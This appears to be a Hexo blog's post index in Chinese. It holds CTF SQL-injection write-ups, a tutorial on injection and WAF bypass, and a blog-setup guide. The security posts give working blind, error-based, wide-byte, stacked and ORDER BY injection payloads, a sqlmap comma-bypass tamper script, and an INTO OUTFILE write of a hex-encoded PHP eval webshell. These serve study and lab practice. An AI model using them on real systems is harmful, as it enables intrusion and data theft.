$ip_arr = explode(&#39;,&#39;, $ip); return $ip_arr[0]; } $host=&quot;localhost&quot;; $user=&quot;&quot;; $pass=&quot;&quot;; $db=&quot;&quot;; $connect = mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;); mysql_select_db($db) or die(&quot;Unable to select database&quot;); $ip = getIp(); echo &#39;your ip is :&#39;.$ip; $sql=&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot;; mysql_query($sql);explode过滤逗号，所以报错注入肯定行不通。看到网上的Wp说是基于时间的盲注，盲注点很显然是XFF。经过测试payload有效： X-Forwarded-For:1&#39;+sleep(5) and &#39;1&#39;=&#39;1页面返回有一个延时，这里就不能用if(,,)语句了，因为过滤了逗号，用另一个注入语句: select case when (条件) then 代码1 else 代码 2 end于是有了如下的payload： 1&#39; and (select case when (select length(flag) from flag limit 1)=32 then sleep(5) else 1 end) and &#39;1&#39;=&#39;1emmm,手注是不可能的，这辈子是不可能手注的（手动滑稽），我们抓个包让sqlmap以XFF为注入点扫描，再加个过滤逗号的tamper就好了。若以XFF为注入点，则要在抓包后的导出文件里XFF后加*，标识为注入点如图：然后找了网上大神的过滤逗号的tamper，放在Sqlmap目录里，命名为comamalessmysql.py #!/usr/bin/env python import re from lib.core.enums import PRIORITY __priority__ = PRIORITY.LOWEST def dependencies(): pass def tamper(payload, **kwargs): &quot;&quot;&quot; Replaces some instances with something whthout comma Requirement: * MySQL Tested against: * MySQL 5.0 &gt;&gt;&gt; tamper(&#39;ISNULL(TIMESTAMPADD(MINUTE,7061,NULL))&#39;) &#39;ISNULL(NULL)&#39; &gt;&gt;&gt; tamper(&#39;MID(VERSION(), 2, 1)&#39;) &#39;MID(VERSION() FROM 2 FOR 1)&#39; &gt;&gt;&gt; tamper(&#39;IF(26=26,0,5)&#39;) &#39;CASE WHEN 26=26 THEN 0 ELSE 5 END&#39; &gt;&gt;&gt; tamper(&#39;IFNULL(NULL,0x20)&#39;) &#39;CASE WHEN NULL=NULL THEN 0x20 ELSE NULL END&#39; &gt;&gt;&gt; tamper(&#39;LIMIT 2, 3&#39;) &#39;LIMIT 3 OFFSET 2&#39; &quot;&quot;&quot; def commalessif(payload): if payload and payload.find(&quot;IF&quot;) &gt; -1: while payload.find(&quot;IF(&quot;) &gt; -1: index = payload.find(&quot;IF(&quot;) depth = 1 comma1, comma2, end = None, None, None for i in xrange(index + len(&quot;IF(&quot;), len(payload)): if depth == 1 and payload[i] == &#39;,&#39; and not comma1: comma1 = i elif depth == 1 and payload[i] == &#39;,&#39; and comma1: comma2 = i elif depth == 1 and payload[i] == &#39;)&#39;: end = i break elif payload[i] == &#39;(&#39;: depth += 1 elif payload[i] == &#39;)&#39;: depth -= 1 if comma1 and comma2 and end: _ = payload[index + len(&quot;IF(&quot;):comma1] __ = payload[comma1 + 1:comma2] ___ = payload[comma2 + 1:end] newVal = &quot;CASE WHEN %s THEN %s ELSE %s END&quot; % (_, __, ___) payload = payload[:index] + newVal + payload[end + 1:] else: break return payload def commalessifnull(payload): if payload and payload.find(&quot;IFNULL&quot;) &gt; -1: while payload.find(&quot;IFNULL(&quot;) &gt; -1: index = payload.find(&quot;IFNULL(&quot;) depth = 1 comma, end = None, None for i in xrange(index + len(&quot;IFNULL(&quot;), len(payload)): if depth == 1 and payload[i] == &#39;,&#39;: comma = i elif depth == 1 and payload[i] == &#39;)&#39;: end = i break elif payload[i] == &#39;(&#39;: depth += 1 elif payload[i] == &#39;)&#39;: depth -= 1 if comma and end: _ = payload[index + len(&quot;IFNULL(&quot;):comma] __ = payload[comma + 1:end].lstrip() newVal = &quot;CASE WHEN %s=NULL THEN %s ELSE %s END&quot; % (_, __, _) payload = payload[:index] + newVal + payload[end + 1:] else: break return payload retVal = payload if payload: retVal = re.sub(r&#39;(?i)TIMESTAMPADD\\(\\w+,\\d+,NULL\\)&#39;, &#39;NULL&#39;, retVal) retVal = re.sub(r&#39;(?i)MID\\((.+?)\\s*,\\s*(\\d+)\\s*\\,\\s*(\\d+)\\s*\\)&#39;, &#39;MID(\\g&lt;1&gt; FROM \\g&lt;2&gt; FOR \\g&lt;3&gt;)&#39;, retVal) retVal = commalessif(retVal) retVal = commalessifnull(retVal) retVal = re.sub(r&#39;(?i)LIMIT\\s*(\\d+),\\s*(\\d+)&#39;, &#39;LIMIT \\g&lt;2&gt; OFFSET \\g&lt;1&gt;&#39;, retVal) return retVal 然后Sqlmap里跑一下，语句如下: 多次这道题困了我一天，一开始我以为是盲注，于是花时间在写脚本花了一天。。后来找到一个wp其实就是手注，只是过滤掉了union一些关键词，看一下题目： 查询有结果时，返回nothing 查询无结果时，返回error %23可注释，引号可用 ok，知道上述条件，我们测一下它过滤了什么。介绍一种检查过滤的方法，叫异或判断：异或是一种逻辑运算，运算法则简言之就是：两个条件相同（同真或同假）即为假（0），两个条件不同即为真（1），null与任何条件做异或运算都为null，如果从数学的角度理解就是，空集与任何集合的交集都为空。ysql里异或运算符为^ 或者 xor 构造id=1’^(条件)^’ 判断的两个条件一个是括号里的条件，另一个是后面的’’，’’为空，即为0。所以括号里的条件若是成立，则页面返回错误；反之则页面返回正常 完整payload:http://120.24.86.145:9004/1ndex.php?id=1&#39;^(length(&#39;union&#39;)=5)^&#39;返回正确，说明判断条件是错的，所以union被过滤了我们用叠加语句看一下 uniunionon是否会被过滤，payload:http://120.24.86.145:9004/1ndex.php?id=1&#39;^(length(&#39;uniunionon&#39;)=5)^&#39;返回错误，说明判断条件正确，所以这个可以当作union使用。 接下来就是一些基础查询了，题目说有两个flag，再查到另一个列时，出现一个网址：Once_More.php 里面还有一道注入题，因为它会回显你提交的参数，所以想知道过滤了什么直接就可以看出来，过滤了Union，我用的报错注入解决的 over，这道题学习了异或注入判断过滤。 login3{SKCTF}tip给了说是布尔盲注在username这个注入点测试一下，初步手工模糊测试，发现过滤了空格、逗号、等号，没有过滤#和’。因为是布尔盲注，那我们构造ascii函数语句。首先我们猜测一个用户名吧,就猜Admin,发现回显是：password error。这说明这个用户名存在，那么我们就可以把这句话作为一个判断对错的语句，结合异或注入进行ascii的猜测。（用户名错误时会返回 username does not exist!） 过滤了‘=’，那么我们ascii的等号语句就没法使用了，经过测试like是绕不过去的。那我们就通过这句话替换掉等号：username=admin&#39;^(ascii(&#39;a&#39;)-97)等价于：username=admin&#39;^(0)异或注入，因为a的十进制ascii为97，所以与（0）异或。 （0）条件时返回”password error” 其余条件时返回”username does not exist!” 直接上py脚本跑：这里需要解释一下，既然过滤了逗号，那么我们substr（,,）的语句就没用了。我们可以换一种形式表达，即substr(database()from1)，这样的返回值如图：所以问题就来了，ascii函数对字符串的返回值是什么呢? 这个问题想了我好久，一开始是找的别人的脚本，看他们写遍历的时候卡在这个地方，这尼玛的ascii面对字符串难道不是返回NULL？！。后来发现自己惯性思维了，测试一下，ascii()这个破函数在处理字符串的时候会返回字符串第一个字符的ascii值，难受ing… 还有一个问题就是过滤掉了information，这让查表就变的头疼。但是我们想一下php后端处理过程，它对username的处理无非是下边框架的语句：select username from 表 where username = “admin”^()所以它为我们已经找好了表了，既然题把information锁死了，那flag就只可能是这个admin的密码了。那我们要做的就是查admin密码 看一下下面这个语句： 我们的密码猜对时，返回false，跟上面异或的思路一样"},{"title":"sql简单的注入和常见的waf绕过","date":"2018-05-28T13:58:00.000Z","path":"2018/05/28/sql简单的注入和常见的waf绕过/","text":"写在前面前一阵子为了做Ctf题临时补了一阵子mysql的相关知识，了解了一些简单的注入流程：查字段数-&gt;查库-&gt;查表-&gt;爆字段。但是应用实战或者其他稍微困难一些的Sql注入题这些还远远不够，所以决定重新学习，系统的做一下归类，并记录一下学习的过程 关于环境本地用Phostudy搭建的PHP+MYSQL环境，写了一个简单的php，类似于无脑的ctf注入题，get传参Id值 简单的注入刚才我们写的Php就是一个没有任何过滤的后端,值得注意的是,#的注释功能现在好像被和谐掉了，在Hackbar只能编码为%23才能代替#的作用（我竟然花了好长时间反复查看自己到底有没有过滤qaq），接下来看一下这类绝迹注入的流程.如果你本地有DVWA的环境,就直接注Simple类型就好了,先贴一张表的结构 查字段?id=1&#39; order by 1/2/3... %23找到一个有回显的注入点，手动去猜字段，返回异常的N-1即为字段数 查库这里字段数确认为3 ?id=-1&#39; select 1,2,database() %23两个月前刚学的时候没有搞清楚没什么Id要改成-1,其实很好理解,mysql的查询如果你的查询是存在的即返回结果,若查询不存在即返回查询结果. 查表?id=-1&#39; select 1,2,table_name from infomation_schema.tables where table_schema=database() %23查列名?id=-1&#39; select 1,2,column_name from information_schema.columns where table_name=&#39;user&#39; %23其中User为我们刚才查到的表 查列名下的具体值?id=-1&#39; select 1,2,user from user %23选择查询的列为user列,一般来说ctf的题都是让你查flag列下的值,Dump出来就好. 关于Information_schemaMySQL 中有一个数据库叫做information_schema，储存数据库和表的元信息。information_schema中有两个重要的表，一个叫tables，储存表的元信息，有两列特别重要，table_schema是所属数据库，table_name是表名称。另一个表示columns，储存列的源信息，table_name列是所属表名称，column_name列是列名称 盲注盲注，即在SQL注入过程中，SQL语句执行选择后，选择的数据不能回显到前端，我们需要使用一些特殊的方法进行判断或尝试，这个过程称为盲注。其实我们用sqlmap完全可以跑，但是只会用工具最多也就是个脚本小子，要想更好的运用Sqlmap进行注入，我觉得应该从基础学起，搞清楚原理才是最重要的。 布尔盲注先贴一张自己写的php即回显只有ture or false limit普及一下用法，用mysql演示一下： 猜库长?id=1&#39; and length(database())=? %23?即为猜解的裤长，可以用二分法，及大于1，小于100，再从50划分长度。若条件成立返回ture 猜库名substr()函数 substr(string,start,length) string(必需)规定要返回其中一部分的字符串。 start(必需)规定在字符串的何处开始。 length(可选)规定被返回字符串的长度。 令外用到ascii()函数，返回查询到的字符的ascii的十进制值，通过大于或者小于的逻辑判断这个值为多少，进而遍历完整的数据库名。?id=1&#39; and ascii(substr(database(),1,1))&gt;? %23通过分析，返回的ascii确认为104，对应‘h’，与库名的hpdoger的第一个字母相应。 猜表名这里需要在substr里嵌套mysql的语句，因为我们要找到对应的表，结合普通查询的语句来构造我们的payload ?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database()),1,1))&gt;116 %23?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database()),1,1))&lt;118 %23两者返回都为ture，可以判断第一个字母ascii值为117 猜列名此语句猜解的是user表的第一个列名，如是想要猜解其它列名，则更改Limit 的值 猜字段值道理相同 基于时间的盲注返回页面无法判断语句是否执行， 面对这种情况，基于布尔的SQL盲注就很难发挥作用了（因为基于布尔的SQL盲注的前提是Web程序返回的页面存在true和false两种不同的页面）。这时 if()与sleep（）其实，基于时间的盲注也是运用逻辑判断。首先看一下if()函数: if()if(expr1,expr2,expr3)如果 expr1 为真，则 IF()函数执行expr2语句; 否则 IF()函数执行expr3语句。 sleep() sleep(seconds)延时一段时间 执行基本思想跟与布尔盲注一样，给一句话，其他的换成相应查询就可以了 ?id=1 and if(ascii(substr(database(),1,1))&gt;100,sleep(10),null)关于绕过Waf浅谈编码绕过wafurl编码这两天一直在刷sqli-labs，做到现在有一点感触。一开始知道有url编码绕过这种方式，但是对于为什么能绕过成功心里是没B数的。经过这两天的测试，我想说的是，这种url编码绕过简直扯淡。人家waf过滤掉了你，你就算编码传过去一个值，到了php页面又被还原再判断，所以相当于没有任何作用。但还是写一下关于url编码的一些理解： 在GET传参的时候,Chrome的url会自动进行编码，而编码形式就是utf-8。一般来说，这个自动编码保留字母和数字不编的形式。其实，我感觉utf-8编码就是为了应对中文问题才诞生的。再说一下解码的问题吧，最初我不理解在php后端什么时候将url解码，后来自己用php传参，echo的结果显示，我们在用$_GET[]时，就将url给解码了。即还原了你的传参原值。所以url编码绕过就是扯淡 %0A换行污染在GET请求时，将URL的SQL注入关键字用%0A分隔，%0A是换行符，在mysql中可以正常执行。可以用%0a代替空格使用 16进制绕过这个目前理解尚浅，在列库名或者表名的时候用过，因为可以避免使用单引号闭合。在concat函数里用过，作为分隔符。即0x7e表示‘~’。 报错注入不得不说updatexml()这个报错函数真的太强了，首先你要了解Xpath。在Mysql中使用了一下这个函数，发现当XPath 使用路径表达式不符合规范时，就会报错，而报错的内容就非常神奇了。下面贴一张报错内容和语法： or updatexml(1,concat(0x7e,database()),1)0x7e是为了构造~分割它爆出了我们查询的库名，只要稍加修改，就可以查表、列、字段等。功能强大，依靠它打lab简直爽的不行。报错注入的姿势有很多，po一个写了十种报错函数的帖子 宽子节注入对于mysql_escape_string或者是mysql_real_escape_string函数转义的单引号，我们都可以用宽子节注入使单引号逃逸。 在GET类型中，我们在单引号前加一个Ascii大于128的编码，因为mysql是以gbk形式读编码的。例如我们构造%df’，则转义后变成%df%5c%27，那么mysql执行语句时，看到前两个编码会结合为汉字，从而是单引号逃逸。 在POST类型中，我们无法再使用%df进行宽子节注入。POST与GET不同，php端不对%df解码（参考对url编码的理解），而是在执行sql查询的时候对%df再进行一次utf-8的编码。结果就是，你在进行sql查询时本想借助%df逃逸，但是现在没有%df可以利用。网上提供了另一种用utf-16进行宽子节注入的payload，这里我拿来用一下，至于为什么utf-16可以借助逃逸，这个我以后学习了16和8的具体转换方式再补上。playload:?id=1� &#39; 二次注入二次注入顾名思义，这里简单说一下储值型的二次注入：我们将要执行的sql语句通过注册用户操作，存储到服务器里，当我们再一次进行操作时直接调用服务器里我们存储的sql语句就可以了（例如修改密码时）。举一个lab里的例子，我们注册用户登陆后,session会获得一个用户名，在那道题里，没有对session得到的用户名进行过滤，而是直接把密码更新到获取的session的用户名下，如果我们的用户名为admin’#，那么就相当于更新了Admin的密码。 堆叠注入堆叠注入区别于二次注入，当没有创建新用户的选项时，可以考虑堆叠注入，在登陆时创建一个新用户入。先看一下labs-42的源码 $username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]); $password = $_POST[&quot;login_password&quot;]; $sql = &quot;SELECT * FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;可以对Username过滤但是未对password过滤，我们就可以为所欲为了。可以通过报错或者盲注查询出表名，构造语句向表中插入用户数据。payload如下：login_user=123&amp;login=a&#39;;insert into users values(16,&#39;Hodoger&#39;,&#39;zq1160307775&#39;) #show tables成功显示我们插入的用户，前提是你要查到这个登陆基于users这个表，至于怎么查，各显神通了。 order by注入order by不能与union select 连用，所以注入就要换思路，可以用报错注入或者延时注入。 报错注入的话，在之前以后列出过十种报错函数可以利用 还有一种注入手段是依靠rand()函数，order by 后的参数直接为rand()，rand中含有表达式，根据rand(ture/false)返回时序列不同来判断表达式是否正确，这里我们以查询库名为例写一个payload猜解:?sort=rand(ascii(left(database(),1))&gt;150) ?sort=rand(ascii(left(database(),1))&lt;200)```sort参数php端用来接收order by处理的值，其实和布尔盲注的思想有些类似 延时注入与基于时间的盲注思路差不多，构造 and if语句 权限的注入into outfile的传马MySQL中，可以使用SELECT…INTO OUTFILE语句将表的内容导出为一个文本文件。其基本的语法格式如下：select [列名] from table into outfile &#39;目标文件&#39; [option]意思就是你查询的列名导出到目标文件中。具体看一道sql labs 46，基于order by 注入的题目payload: ?sort=1 into outfile &#39;D:\\\\phpStudy\\\\WWW\\\\sqli-labs-master\\\\Less-46\\\\test.php&#39; lines terminated by 0x3c3f706870206576616c28245f504f53545b6870646f6765725d293b203f3esort是题目里给的order by要查询的参数，outfile后接网站的绝对路径，test.php是我要写入的文件（没有时新建），lines terminated by接木马的16进制。union select 也可以与into outfile联合使用，因为这道题是order by注入无法使用union select写入，所以借助了lines terminated by 。但是我在写入的时候出现下面的页面这就是into outfile的限制了。写入之前先看看into outfile 的权限吧：如果要实现用into outfile把代码写到WEB目录下，取得WEBSHELL 3大先天条件： 知道物理路径（into outfile ‘WEB目录的物理路径’）这样才能写对目录。（默认的当前目录是MySQL的数据目录） 能够使用union（也就是MySQL版本在3以上） 没有对’进行过滤（因为outfile后面的’’不可以用其他函数代替转换） 2大后天条件： MySQL用户拥有file_priv权限（不然就不能写文件或者把文件内容读出） 对web目录有写权限。很明显，我没有file_priv的权限，在mysql里查看一下也能看到，如图可以自行百度一下如何在windows下开启file_priv的权限，其实就是在my.ini里把路径置空就好，重启mysql。开启后再执行payload显示如下图：在路径下看一下传马是否成功，如图菜刀连接一下，成功传马成功，下一步就是花样提权。不过目前导出文件的file_priv几乎都不会开启，即root的权限过低，所以可以想办法把它开启。 写在最后最近大佬丢了我一本sqli-labs的武林秘籍，手工打完了还是有很大收获。其实里面很多题也是可以放到sqlmap里跑，但是做个脚本小子并不是我想要的，最近忙完了转专业这些事，准备闭关修炼一下。先在这里贴一些sqlmap里tamper的用法和介绍，博客总结的很好，而且也po出来一些Url，可以参考一下。"},{"title":"利用Hexo和Github搭建个人博客","date":"2018-05-26T14:38:06.000Z","path":"2018/05/26/利用Hexo和Github搭建个人博客/","text":"写在前面大一萌新一枚，想学点技术写一个自己的博客，记录自己的点滴。能力有限，又总要写点什么，那就写一下这次创建blog的心酸经历 准备工具 首先要有一个Github账号，创建一个Reposity（库），name为username.github.io，其中username必须为你的Github账号名，否则你建立的库只会在Pages下的目录，并不是主页，个人觉得是github官方的限制，总不可能让你无限制的拥有创建主页面域名。 需要安装Git,emmm..如果你不知道什么是Git 需要安装Node.js 需要安装Hexo,hexo是一款基于Node.js的静态博客框架,就是说我们可以通过hexo创建我们的博文，将md文件转换成静态文件，再部署到Github上;Hexo可以在安装了Node.js之后通过npm安装：$ npm install hexo-cli -g 笔者是在cmd下运行的npm，但看到网上的方法说最好打开Git bash运行安装根目录初始化 首先创建一个文件夹，名字最好为uername.github.io（便与管理站点）。文件夹用来存放Hexo的配置文件 命令行Cd到该文件夹下，或者右键git bash，执行命令：$hexo init 安装依赖包：$nmp install 此时该文件夹下会多出来很多文件，目录如下：. ├── _config.yml ├── package.json ├── scaffolds ├── source | ├── _drafts | └── _posts └── themes 即为Hexo的配置文件安装上传插件 hexo-deployer-git$ npm install hexo-deployer-git --save 这个插件支持本地修改上传到Github布置自己的网站Clone一个你喜欢的骚主题到文件夹 这里笔者用的是Next，通过Git命令执行的github克隆：git clone https://github.com/iissnan/hexo-theme-next themes/next 需要一定的时间，克隆后的文件夹名为next，在themes目录下 其中，_config.yml是博客页面的配置文件,使用详情左戳 配置主目录 打开主目录下_config.yml 修改主题，使其指向我们使用的主题theme:next 修改deploy项，与你自己的github相对应deploy: type: git repo: https://github.com/Hpd0ger/Hpd0ger.github.io.git name: Hpdoger email: # 注册Github的邮箱 branch: master 这个deploy信息是hexo-deployer-git插件的工作认证，执行部署操作的时候，首先会自动初始化git仓库（位置在.deploy_git中），并关联到指定repo与branch，后续public文件夹中自动生成的页面代码将会拷贝至此目录中进行代码管理。若修改了name和email，需要删掉整个.deploy_git再重新部署才会生效以及你的Github账号。部署到GitHub上主要有三个步骤： hexo g：$hexo generate ：将source\\_post文件下的md文件转成静态页面到public文件夹下 hexo s:$hexo s ： 生成本地预览，默认情况下，访问网址为： http://localhost:4000/ hexo d:$hexo d ：将.deploy目录部署到GitHub 特别注意：$hexo clean ：清除缓存文件(db.json)和已生成的静态文件(public)。在某些情况（尤其是更换主题后），如果发现您对站点的更改无论如何也不生效，您可能需要运行该命令。 现在登陆一下自己的博客，看看有没有成功哦 写博客创建一篇博文$hexo new &#39;文章名&#39; 会在source_post文件下创建一个md文件，系统已经为你写好了标题和日期 创建一个页面$hexo new page &quot;页面名&quot; #如 tages、catagories 创建页面就是在主页上显示你的页面名，即你在博文的开头定义的这篇博文的标签、分类，即属于页面内容会在source\\目录下建立对应名称的文件夹，文件夹下有对应名称的md文件 使用Markdown编辑器笔者使用的是cmd markdown，由于画面比较小清新所以一直使用，如果你氪金的话还可以将md文件转化为pdf格式。 Markdown语法介绍 这里有一篇不错的博文介绍了一下用法，个人觉得还不错链接 值得注意的就是标题的套用 对于hexo，有两种方式：使用本地路径：在hexo/source目录下新建一个img文件夹，将图片放入该文件夹下，插入图片时链接即为/img/图片名称。使用图床，地址将图片拖入区域中，会生成图片的URL，这就是链接地址。第一种没有成功，笔者一直用的第二种 写在最后这是笔者的第一篇博文，参考了一些google的资料。写博客目的只是为了能够提高自己，把自己所见所学写下来，比如这次博客的搭建，就花费了好多时间。最近还要忙着考四级和转专业，希望院里面的申请能通过。文采有限，希望有不对或者不好的地方可以反馈给我，接下来的阶段会闭关修炼一阵子，传一下ctf题或者sql注入绕过的博文吧。 未来的路还有很长，希望自己可以一直走下去"}]